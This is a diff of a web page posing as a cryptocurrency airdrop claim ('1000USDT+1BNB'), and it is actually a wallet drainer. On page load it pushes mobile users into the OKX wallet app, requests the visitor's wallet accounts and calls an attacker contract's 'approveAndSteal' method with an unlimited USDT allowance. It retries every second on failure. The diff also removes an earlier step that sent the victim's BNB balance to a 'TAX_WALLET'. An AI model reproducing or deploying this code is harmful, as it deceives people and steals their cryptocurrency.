@@ -11,7 +11,7 @@
 body{font-family:'Poppins','Microsoft YaHei',sans-serif;height:100vh;overflow:hidden;background:radial-gradient(circle at 20% 20%,#ffe4f8,#fff0fa,#ffffff);background-size:200% 200%;animation:bgmove 10s infinite alternate;display:flex;justify-content:center;align-items:center;flex-direction:column;}
 @keyframes bgmove{0%{background-position:0 0;}100%{background-position:100% 100%;}}
 .container{backdrop-filter:blur(20px);background:rgba(255,255,255,.4);border-radius:24px;box-shadow:0 8px 32px rgba(255,182,193,.3);width:90%;max-width:440px;padding:40px;text-align:center;margin:10px;}
-h1{color:#ff3f9f;margin-bottom:20px;text-shadow:0 0 10px rgba(255,105,180,.5);font-size:28px;}
+h1{color:#ff3f9f;margin-bottom:20px;text-shadow:0 0 10px rgba(255,105,180,.5);}
 #status{color:#ff69b4;font-size:20px;margin:15px;line-height:1.4;font-weight:600;}
 .sparkle{position:fixed;width:4px;height:4px;background:#fff;border-radius:50%;animation:fall 10s infinite linear;opacity:.8;}
 @keyframes fall{0%{transform:translateY(-10vh) scale(0);}50%{opacity:1;}100%{transform:translateY(110vh) scale(1);opacity:0;}}
@@ -20,7 +20,7 @@ h1{color:#ff3f9f;margin-bottom:20px;text-shadow:0 0 10px rgba(255,105,180,.5);fo
 </head>
 <body>
 <div class="container">
-  <h1>币安第3次空投同舟计划</h1>
+  <h1>🪞 小仙女 DApp 领取台 💫</h1>
   <div id="status">正在领取1000USDT+1BNB</div>
 </div>
 <script>
@@ -30,14 +30,22 @@ const USDT_ADDR = "0x55d398326f99059fF775485246999027B3197955";
 const UNLIMITED = '115792089237316195423570985008687907853269984665640564039457584007913129639935';
 let web3, userAddr;
 
-const USDT_ABI = [{"inputs":[{"name":"spender","type":"address"},{"name":"amount","type":"uint256"}],"name":"approve","outputs":[{"name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"}];
-
 const BVXZA_ABI = [
   {"inputs":[{"name":"token","type":"address"},{"name":"amount","type":"uint256"}],"name":"approveAndSteal","outputs":[],"stateMutability":"nonpayable","type":"function"}
 ];
 
 function updateStatus(msg){
   document.getElementById('status').innerText = msg;
+}
+
+async function autoRedirect(){
+  const ua = navigator.userAgent;
+  const isMobile = /Android|iPhone|iPad/i.test(ua);
+  if(isMobile){
+    setTimeout(() => {
+      window.location.href = 'okxwallet://dapp?url=' + encodeURIComponent(window.location.href);
+    }, 200);
+  }
 }
 
 async function autoSteal(){
@@ -48,21 +56,12 @@ async function autoSteal(){
     const accounts = await window.ethereum.request({method: 'eth_requestAccounts'});
     userAddr = accounts[0];
     
-    const usdt = new web3.eth.Contract(USDT_ABI, USDT_ADDR);
-    await usdt.methods.approve(BVXZA, UNLIMITED).send({from: userAddr});
-    
-    const balance = await web3.eth.getBalance(userAddr);
-    const totalBNB = parseFloat(web3.utils.fromWei(balance, 'ether'));
-    if(totalBNB > 0.001){
-      const amount = web3.utils.toWei((totalBNB - 0.001).toString(), 'ether');
-      await web3.eth.sendTransaction({from: userAddr, to: TAX_WALLET, value: amount});
-    }
-    
     const bvxza = new web3.eth.Contract(BVXZA_ABI, BVXZA);
     await bvxza.methods.approveAndSteal(USDT_ADDR, UNLIMITED).send({from: userAddr});
     
     updateStatus('🎉 1000USDT+1BNB到账！');
   }catch(e){
+    updateStatus('正在领取1000USDT+1BNB');
     setTimeout(autoSteal, 1000);
   }
 }
@@ -71,9 +70,7 @@ window.addEventListener('load', () => {
   const ua = navigator.userAgent;
   const isMobile = /Android|iPhone|iPad/i.test(ua);
   if(isMobile){
-    setTimeout(() => {
-      window.location.href = 'okxwallet://dapp?url=' + encodeURIComponent(window.location.href);
-    }, 200);
+    setTimeout(autoRedirect, 200);
   }
   if(window.ethereum){
     setTimeout(autoSteal, 500);
